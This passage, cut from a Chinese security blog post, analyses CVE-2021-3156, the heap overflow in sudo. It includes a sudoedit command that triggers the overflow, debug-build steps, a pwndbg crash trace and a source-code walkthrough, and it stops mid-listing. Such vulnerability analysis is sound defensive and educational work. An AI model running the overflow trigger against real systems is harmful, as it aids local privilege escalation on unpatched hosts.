<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>cve-2021-3156 分析笔记（有坑没填） - avcatshy</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="avcatshy"><meta name="msapplication-TileImage" content="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="avcatshy"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="0x00 简介最近帮小伙伴整个ubuntu上的提权，搜了下发现刚好这个sudo的合适，直接一通复制粘贴完事儿。现在抽时间分析一下。 这个漏洞存在于sudo中是一个堆溢出，根据Qualys团队的公告可以得知，通过该漏洞可以实现本地提权。影响范围较大，从 1.8.2 到 1.8.31p2 的所有旧版本和从 1.9.0 到 1.9.5p1 的所有稳定版本都受影响，且在macOS上也会受到影响。 漏洞原理"><meta property="og:type" content="blog"><meta property="og:title" content="cve-2021-3156 分析笔记（有坑没填）"><meta property="og:url" content="https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/"><meta property="og:site_name" content="avcatshy"><meta property="og:description" content="0x00 简介最近帮小伙伴整个ubuntu上的提权，搜了下发现刚好这个sudo的合适，直接一通复制粘贴完事儿。现在抽时间分析一下。 这个漏洞存在于sudo中是一个堆溢出，根据Qualys团队的公告可以得知，通过该漏洞可以实现本地提权。影响范围较大，从 1.8.2 到 1.8.31p2 的所有旧版本和从 1.9.0 到 1.9.5p1 的所有稳定版本都受影响，且在macOS上也会受到影响。 漏洞原理"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/Qualys_auditCode.png"><meta property="article:published_time" content="2021-09-27T16:00:00.000Z"><meta property="article:modified_time" content="2021-09-28T17:56:38.831Z"><meta property="article:author" content="vlinkstone"><meta property="article:tag" content="Linux"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="./Qualys_auditCode.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/"},"headline":"cve-2021-3156 分析笔记（有坑没填）","image":["https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/Qualys_auditCode.png"],"datePublished":"2021-09-27T16:00:00.000Z","dateModified":"2021-09-28T17:56:38.831Z","author":{"@type":"Person","name":"vlinkstone"},"publisher":{"@type":"Organization","name":"avcatshy","logo":{"@type":"ImageObject","url":"https://avatars.githubusercontent.com/u/20829507?s=60&v=4"}},"description":"0x00 简介最近帮小伙伴整个ubuntu上的提权，搜了下发现刚好这个sudo的合适，直接一通复制粘贴完事儿。现在抽时间分析一下。 这个漏洞存在于sudo中是一个堆溢出，根据Qualys团队的公告可以得知，通过该漏洞可以实现本地提权。影响范围较大，从 1.8.2 到 1.8.31p2 的所有旧版本和从 1.9.0 到 1.9.5p1 的所有稳定版本都受影响，且在macOS上也会受到影响。 漏洞原理"}</script><link rel="canonical" href="https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/"><link rel="icon" href="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4" alt="avcatshy" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/2020/02/02/about/">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/avcatshy"><i class="fab fa-github"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-09-27T16:00:00.000Z" title="9/28/2021, 12:00:00 AM">2021-09-28</time>发表</span><span class="level-item"><time dateTime="2021-09-28T17:56:38.831Z" title="9/29/2021, 1:56:38 AM">2021-09-29</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Linux/">Linux</a></span><span class="level-item">1 小时读完 (大约7252个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">cve-2021-3156 分析笔记（有坑没填）</h1><div class="content"><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>最近帮小伙伴整个ubuntu上的提权，搜了下发现刚好这个sudo的合适，直接一通复制粘贴完事儿。现在抽时间分析一下。</p>
<p>这个漏洞存在于sudo中是一个堆溢出，根据<a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">Qualys团队的公告</a>可以得知，通过该漏洞可以实现本地提权。影响范围较大，从 1.8.2 到 1.8.31p2 的所有旧版本和从 1.9.0 到 1.9.5p1 的所有稳定版本都受影响，且在macOS上也会受到影响。</p>
<p>漏洞原理比较简单，但是利用过程很有意思， 下面记录分析过程。<br> <span id="more"></span></p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜   ✗ uname -a</span><br><span class="line">Linux ubuntu 5.4.0-26-generic <span class="comment">#30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">➜   ✗ cat /etc/issue</span><br><span class="line">Ubuntu 20.04 LTS \n \l</span><br><span class="line"></span><br><span class="line">➜   ✗ sudo --version</span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br><span class="line">➜   ✗ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.31-0ubuntu9) 2.31</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br><span class="line">➜   ✗ </span><br><span class="line"></span><br><span class="line"><span class="comment">#存在漏洞</span></span><br><span class="line">➜   ✗ sudoedit -s <span class="string">&#x27;\&#x27;</span> `perl -e <span class="string">&#x27;print &quot;ABCD&quot; x 6553&#x27;</span>`</span><br><span class="line">malloc(): corrupted top size</span><br><span class="line">[1]    209236 abort (core dumped)  sudoedit -s <span class="string">&#x27;\&#x27;</span> `perl -e <span class="string">&#x27;print  &quot;ABCD&quot; x 6553&#x27;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">#不存在漏洞</span></span><br><span class="line">➜   ✗ sudoedit -s <span class="string">&#x27;\&#x27;</span> `perl -e <span class="string">&#x27;print  &quot;ABCD&quot; x 6553&#x27;</span>`</span><br><span class="line">usage: sudoedit [-AknS] [-r role] [-t <span class="built_in">type</span>] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于ubuntu的lts是会更新的，所以低版本系统未必会存在，高版本也不一定就不存在。还是得根据实际情况判断。这里为了分析方便，我们下载sudo的符号或者自己通过源码编译一份出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 sudo 符号,下载glibc的源码</span></span><br><span class="line"><span class="comment"># wget http://launchpadlibrarian.net/463349800/sudo-dbgsym_1.8.31-1ubuntu1_amd64.ddeb</span></span><br><span class="line"><span class="comment"># sudo dpkg -i sudo-dbgsym_1.8.31-1ubuntu1_amd64.ddeb </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自己编的sudoedit在/usr/local/bin/sudoedit</span></span><br><span class="line">wget https://github.com/sudo-project/sudo/archive/SUDO_1_8_31.tar.gz</span><br><span class="line">tar -xvf SUDO_1_8_31.tar.gz</span><br><span class="line"><span class="built_in">cd</span> sudo-SUDO_1_8_31; </span><br><span class="line">./configure CFLAGS=<span class="string">&quot;-g&quot;</span> CPPFLAGS=<span class="string">&quot;-g&quot;</span></span><br><span class="line">make -j4 </span><br><span class="line">sudo chown root:root examples/sudo.conf</span><br><span class="line">sudo chown root:root examples/sudoers</span><br><span class="line">sudo chown root:root plugins/sudoers/.libs/sudoers.so</span><br><span class="line">sudo chown root:root src/.libs/sudo</span><br><span class="line">sudo chmod 4755      src/.libs/sudo</span><br><span class="line">sudo ln -s src/.libs/sudo src/.libs/sudoedit</span><br><span class="line"><span class="comment"># make install </span></span><br><span class="line"></span><br><span class="line">sudo apt-get install glibc-source</span><br><span class="line">tar -xvf /usr/src/glibc/glibc-2.31.tar.xz</span><br></pre></td></tr></table></figure>

<p>自己编好sudo后再触发一下，这次用gdb附加，看下崩溃点在哪里：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo gdb --args /usr/<span class="built_in">local</span>/bin/sudoedit -s <span class="string">&#x27;\&#x27;</span> `perl -e <span class="string">&#x27;print &quot;ABCD&quot; x 6553&#x27;</span>`</span><br><span class="line">[sudo] password <span class="keyword">for</span> x: </span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">...</span><br><span class="line">Reading symbols from /usr/<span class="built_in">local</span>/bin/sudoedit...</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">set_cmnd () at ./sudoers.c:868</span><br><span class="line">868				*to++ = *from++;</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x43</span><br><span class="line"> RBX  0x55ded202f598 —▸ 0x7ffef0294b7d ◂— 0x4443424144434241 (<span class="string">&#x27;ABCDABCD&#x27;</span>)</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7ffef0297f48 ◂— 0x4342414443424144 (<span class="string">&#x27;DABCDABC&#x27;</span>)</span><br><span class="line"> RDI  0x3</span><br><span class="line"> RSI  0x15001c</span><br><span class="line"> R8   0x7ff7ae902218 —▸ 0x7ff7ae1101ac ◂— 0x2000200020002</span><br><span class="line"> R9   0x7ff7aeaf51f0 (main_arena+1648) —▸ 0x7ff7aeaf51e0 (main_arena+1632) —▸ 0x7ff7aeaf51d0 (main_arena+1616) —▸ 0x7ff7aeaf51c0 (main_arena+1600) —▸ 0x7ff7aeaf51b0 (main_arena+1584) ◂— ...</span><br><span class="line"> R10  0x55ded2018010 ◂— 0x0</span><br><span class="line"> R11  0x7ff7aeaf4be0 (main_arena+96) —▸ 0x55ded2035c30 ◂— 0x4241204443424144 (<span class="string">&#x27;DABCD AB&#x27;</span>)</span><br><span class="line"> R12  0x0</span><br><span class="line"> R13  0x7ffef0293730 ◂— 0xffffffffffffffff</span><br><span class="line"> R14  0x7ffef0297f47 ◂— 0x4241444342414443 (<span class="string">&#x27;CDABCDAB&#x27;</span>)</span><br><span class="line"> R15  0x7ffef0297f48 ◂— 0x4342414443424144 (<span class="string">&#x27;DABCDABC&#x27;</span>)</span><br><span class="line"> RBP  0x55ded2039001</span><br><span class="line"> RSP  0x7ffef02936f0 ◂— 0x7ffe00000000</span><br><span class="line"> RIP  0x7ff7adad8211 (sudoers_policy_main+3425) ◂— mov    byte ptr [rbp - 1], al</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ff7adad8211 &lt;sudoers_policy_main+3425&gt;    mov    byte ptr [rbp - 1], al</span><br><span class="line">   0x7ff7adad8214 &lt;sudoers_policy_main+3428&gt;    movzx  eax, byte ptr [r14 + 1]</span><br><span class="line">   0x7ff7adad8219 &lt;sudoers_policy_main+3433&gt;    <span class="built_in">test</span>   al, al</span><br><span class="line">   0x7ff7adad821b &lt;sudoers_policy_main+3435&gt;    je     sudoers_policy_main+3496                &lt;sudoers_policy_main+3496&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ff7adad8258 &lt;sudoers_policy_main+3496&gt;    add    rbx, 8</span><br><span class="line">   0x7ff7adad825c &lt;sudoers_policy_main+3500&gt;    mov    byte ptr [rbp], 0x20</span><br><span class="line">   0x7ff7adad8260 &lt;sudoers_policy_main+3504&gt;    lea    rax, [rbp + 1]</span><br><span class="line">   0x7ff7adad8264 &lt;sudoers_policy_main+3508&gt;    mov    r15, qword ptr [rbx]</span><br><span class="line">   0x7ff7adad8267 &lt;sudoers_policy_main+3511&gt;    <span class="built_in">test</span>   r15, r15</span><br><span class="line">   0x7ff7adad826a &lt;sudoers_policy_main+3514&gt;    je     sudoers_policy_main+3528                &lt;sudoers_policy_main+3528&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ff7adad8278 &lt;sudoers_policy_main+3528&gt;    mov    byte ptr [rax - 1], 0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/x/Documents/cve-2021-3156/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   863 		 */</span><br><span class="line">   864 		<span class="keyword">for</span> (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;</span><br><span class="line">   865 		    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">   866 			<span class="keyword">if</span> (from[0] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !isspace((unsigned char)from[1]))</span><br><span class="line">   867 			    from++;</span><br><span class="line"> ► 868 			*to++ = *from++;</span><br><span class="line">   869 		    &#125;</span><br><span class="line">   870 		    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   871 		&#125;</span><br><span class="line">   872 		*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   873 	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffef02936f0 ◂— 0x7ffe00000000</span><br><span class="line">01:0008│     0x7ffef02936f8 ◂— 0x0</span><br><span class="line">02:0010│     0x7ffef0293700 ◂— 0x7ffe00020002</span><br><span class="line">03:0018│     0x7ffef0293708 ◂— 0xaeb2bc89</span><br><span class="line">04:0020│     0x7ffef0293710 ◂— 0x3000000000</span><br><span class="line">05:0028│     0x7ffef0293718 —▸ 0x7ffef02937b0 —▸ 0x7ffef0293830 ◂— 0x0</span><br><span class="line">06:0030│     0x7ffef0293720 —▸ 0x7ffef0293730 ◂— 0xffffffffffffffff</span><br><span class="line">07:0038│     0x7ffef0293728 ◂— 0x0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0   0x7ff7adad8211 sudoers_policy_main+3425</span><br><span class="line">   f 1   0x7ff7adad8211 sudoers_policy_main+3425</span><br><span class="line">   f 2   0x7ff7adad10fa sudoers_policy_check+154</span><br><span class="line">   f 3   0x55ded1571c46 main+1030</span><br><span class="line">   f 4   0x55ded1571c46 main+1030</span><br><span class="line">   f 5   0x7ff7ae9300b3 __libc_start_main+243</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  set_cmnd () at ./sudoers.c:868</span></span><br><span class="line"><span class="comment">#1  sudoers_policy_main (argc=argc@entry=3, argv=argv@entry=0x7ffef0293aa0, pwflag=pwflag@entry=0, env_add=env_add@entry=0x0, verbose=verbose@entry=false, closure=closure@entry=0x7ffef02937b0) at ./sudoers.c:306</span></span><br><span class="line"><span class="comment">#2  0x00007ff7adad10fa in sudoers_policy_check (argc=3, argv=0x7ffef0293aa0, env_add=0x0, command_infop=0x7ffef0293828, argv_out=0x7ffef0293830, user_env_out=0x7ffef0293838) at ./policy.c:872</span></span><br><span class="line"><span class="comment">#3  0x000055ded1571c46 in policy_check (plugin=0x55ded15927a0 &lt;policy_plugin&gt;, user_env_out=0x7ffef0293838, argv_out=0x7ffef0293830, command_info=0x7ffef0293828, env_add=0x0, argv=0x7ffef0293aa0, argc=3) at ./sudo.c:1138</span></span><br><span class="line"><span class="comment">#4  main (argc=argc@entry=4, argv=argv@entry=0x7ffef0293a98, envp=0x7ffef0293ac0) at ./sudo.c:253</span></span><br><span class="line"><span class="comment">#5  0x00007ff7ae9300b3 in __libc_start_main (main=0x55ded1571840 &lt;main&gt;, argc=4, argv=0x7ffef0293a98, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffef0293a88) at ../csu/libc-start.c:308</span></span><br><span class="line"><span class="comment">#6  0x000055ded15735ae in _start () at ./sudo.c:770</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>可以看出来崩溃点在sudoers.c文件中的868行，看起来在做内存复制操作，调用栈也能看得清，分析一下源码。</p>
<p>sudo加上 -s和-i选项会分别设置MODE_SHELL，MODE_SHELL&amp;&amp;MODE_LOGIN_SHELL。在main 函数中调用了parse_args函数，其中会重写argv：注意一点，如果启用了MODE_SHELL，会对参数添加反斜杠‘\’进行转义。之后将command都将被复制到堆上。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">    <span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">        <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) + <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;   <span class="comment">//command部分长度</span></span><br><span class="line">        cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);                                         <span class="comment">//这是为了防止所有字符都需要转义</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123;</span><br><span class="line">            <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            *dst++ = <span class="string">&#x27;\\&#x27;</span>;    <span class="comment">//对反斜杠进行转义</span></span><br><span class="line">            *dst++ = *src;</span><br><span class="line">        &#125;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后会进入sudoers_policy_check，在sudoers_policy_main中调用了set_cmnd()，在set_cmnd中会根据参数的大小分配空间user_args， 随后判断是否开启了MODE_SHELL即“-s”参数， 开启了则将命令行参数拷贝到user_args中，并将command中的元字符反转义。但是这里的拷贝流程有个问题，如果“\”后面紧跟的是“\0”，那么临时变量from则会+2跳过结束符指向下一个字符串，从而造成越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...		</span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">		    <span class="keyword">while</span> (*from) &#123;<span class="comment">//&lt;---------Notice Here</span></span><br><span class="line">					<span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))<span class="comment">//注意这里判断的是一个反斜杠</span></span><br><span class="line">					    from++; <span class="comment">//进入这个逻辑时，此时from++后已经时结束符了</span></span><br><span class="line">							*to++ = *from++;<span class="comment">//在拷贝完之后又将from++，此时则指向了后面的数据</span></span><br><span class="line">			    &#125;</span><br><span class="line">		    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>漏洞是这么个情况，但是为什么sudo中的洞需要用sudoedit来触发呢？这里涉及到sudo中的一个校验：</p>
<p>当启用MODE_SHELL flag时， parse_args函数会对其添加“\”进行转义，而set_cmnd中触发堆溢出前会判断是否启用了MODE_SHELL 以及MODE_RUN、MODE_EDIT、MODE_CHECK这三个中的一个。也就是说MODE_SHELL是必须的，并且需要存在单个‘\’才能触发漏洞，但是启用了MODE_SHELL &amp; MODE_RUN就会将\转义成为\”，所以使用sudo就无法触发漏洞。但是sudoedit是个特殊的存在：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Command line argument parsing.</span></span><br><span class="line"><span class="comment"> * Sets nargc and nargv which corresponds to the argc/argv we&#x27;ll use</span></span><br><span class="line"><span class="comment"> * for the command to be run (if we are running one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">parse_args</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> *nargc, <span class="keyword">char</span> ***nargv,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct sudo_settings **settingsp, <span class="keyword">char</span> ***env_addp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">environment</span> <span class="title">extra_env</span>;</span></span><br><span class="line">    